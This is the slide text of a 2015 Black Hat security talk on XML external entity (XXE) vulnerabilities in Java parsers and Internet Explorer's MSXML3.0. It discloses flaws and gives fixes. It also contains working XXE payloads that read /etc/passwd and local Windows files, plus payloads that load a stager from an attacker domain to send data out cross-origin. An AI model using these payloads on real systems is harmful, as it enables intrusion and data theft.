FileCry - The New Age of XXE

Xiaoran Wang & Sergey Gorbaty

August 6, 2015 Black Hat USA 2015

Agenda
· Background · Saga of one failed XXE defense · We need a bigger target! · Conclusions · Q&A

Background
"All external parameter entities are well-formed by definition" (http://www.w3.org/TR/REC-xml/#sec-external-ent)

XXE 101
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <foo>&xxe;</foo>

Past Presentations
· OWASP 2010 - XXE Attack · BH USA 2012 - XXE Tunneling in SAP · BH EU 2013 - XML OOB Data retrieval · DC 02139 - Advanced XXE Exploitation · ...

Why Are We Still Here?
· Not just your apps that need the fix! · Server and client tech that runs your app also
need a fix!

JDK Vuln Disclosed
Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20; Java SE Embedded 7u60; and Jrockit R27.8.3 and R28.3.3 allows remote attackers to affect confidentiality via vectors related to JAXP.

In the beginning...
· There was an XMLInputFactory · And it had a wonderful feature · IS_SUPPORTING_EXTERNAL_ENTITIES · And its default value was · Unspecified

In the beginning...
· There was an XMLInputFactory · And it had a wonderful feature · IS_SUPPORTING_EXTERNAL_ENTITIES · And its default value was · Unspecified

It Could Be Set To False...
XMLInputFactory inputFactory = XMLInputFactory.newFactory();
inputFactory.setProperty( XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
But...

It Did NOT Work!

"Safe" Factory Demo

JDK Fragmentation
· How many of you still run JDK6?

JDK Fragmentation
· How many of you still run JDK6? · What about JDK7?

JDK Fragmentation
· How many of you still run JDK6? · What about JDK7? · How many do not run JDK8?

How to Exfiltrate Data?
· DNS OOB resolver · 63 char limit for subdomain name · Only letters, numbers and hyphen allowed · Space, \t seem to work okay · Cannot parse % & #, null
· XML exception printing · Does not have the above limitations!

Causing Exceptions
· file, ftp, http, gopher, https, mailto · netdoc and jar are smarter
· can resolve relative URI · local file

XMLStreamException

Showing Exceptions
May not be a good idea...

Showing Exceptions
May not be a good idea...

But Wait...
· JDK7 has more XML parsers... · javax.xml.parsers.DocumentBuilderFactory · javax.xml.parsers.SaxParserFactory · TransformerFactory · Validator · SchemaFactory · Unmarshaller · SAXTransformerFactory · XPathExpression · XMLReader · XMLInputFactory

And More...
· Popular 3rd party parsers · org.apache.commons.digester.Digester · Woodstock · dom4j · XOM · ...

What Are We Dealing With?
· W/o ability to turn off external entities/DTD
· javax.xml.transform.TransformerFactory · javax.xml.validation.Validator · javax.xml.transform.sax.SAXTransformerFactory
· W/o features to set
· javax.xml.bind.Unmarshaller
· Supporting a resolver
· org.xml.sax.XMLReader · javax.xml.parsers.DocumentBuilder

Speaking of Resolvers
Eclipse Auto-generated Stub

Speaking of Resolvers (II)
CORRECT WAY

Universal Fix
· factory.setProperty(XMLConstants.ACCESS_E XTERNAL_DTD, "");
· disables protocols, e.g. http:, file:, jar: · http://openjdk.java.net/jeps/185

Bigger Target!
· So far XXE is a Web attack · Let's replicate it on native application!
· What's an native app that is used by billions of users?

Bigger Target!
· So far XXE is a Web attack · Let's replicate it on native application!
· What's an native app that is used by billions of users?
· Browsers · are used by a lot of people · parses a lot of XML

The history of browser XXEs
· Chrome/Safari · libxml2 XXE fixed in 2012 · CVE-2013-0339
· Firefox · expat XXE fixed in 2012 · CVE-2013-0341
· IE · MSXML XXE fixed in 2006 with v6

MSXML3.0
A living corpse still available in IE

MSXML3.0

MSXML3.0

MSXML3.0
· So why is the old MSXML3.0 still available in IE 11? · Compatibility · Quirk mode is a friend

JavaScript XML parsing 101
· IE's way · new ActiveXObject(`MSXML').loadXML (xml);
· Other browser's way · new DOMParser().parseFromString (xml, "application/xml");

Payload 1
Regular XML that tries to read cross origin, didn't work <?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE export [ <!ELEMENT export (#PCDATA)> <!ENTITY % loot SYSTEM "http://www.victim.com/"> <!ENTITY % stager SYSTEM "http://test.attackerdomain.com/xxe/entity.xml"> %stager; ]> <export>&all;</export>

Demo
Standard Payload Does not Work

Bypass
· Same Origin Policy blocked us · How is same origin policy usually bypassed?

Bypass
· Same Origin Policy blocked us · How is same origin policy usually bypassed?
· SVGs

Bypass
· Same Origin Policy blocked us · How is same origin policy usually bypassed?
· SVGs · setTimeOut

Bypass
· Same Origin Policy blocked us · How is same origin policy usually bypassed?
· SVGs · setTimeOut · redirects

Payload 2
Exfiltrate data cross-origin with redirects <?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE export [ <!ELEMENT export (#PCDATA)> <!ENTITY % loot SYSTEM "http://test.attacker-domain.com/ redirect?site=http://www.victim.com/"> <!ENTITY % stager SYSTEM "http://test.attacker-domain.com/ xxe/entity.xml"> %stager; ]> <export>&all;</export>

Demo
Cross-origin XXE in IE

Payload 3
Exfiltrate data on local disk <?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE export [ <!ELEMENT export (#PCDATA)> <!ENTITY % loot SYSTEM "http://test.attacker-domain.com/ redirect?site=file:///windows/msdfmap.ini"> <!ENTITY % stager SYSTEM "http://test.attacker-domain.com/ xxe/entity.xml"> %stager; ]> <export>&all;</export>

Demo
Reading Disk Contents

Limitations
· Victim file/site cannot contain <,%,>,null-byte · meaning most HTML pages are not vulnerable · JSON pages are · binary files are not vulnerable
· Only works on Windows 7 and below · all IE versions though

Defenses
· Update to latest IE 11 · Use Windows 8 and up

Conclusions
· XXE is a severe category of vulnerabilities that deserves more attention
· Other languages and products could be vulnerable too
· XML parsing libraries should be secure by default

Contributions
Anton Rager Nir Goldshlager Hormazd Billimoria Jonathan Brossard Cory Michal

Q&A
Thank you

Xiaoran Wang
Attacker-Domain.com xiaoran@attacker-domain.com //twitter.com/0xla0ran
Sergey Gorbaty
serg.gorbaty@gmail.com //twitter.com/ser_gor
If you enjoyed our talk... Please *leave feedback* on the Black Hat forms

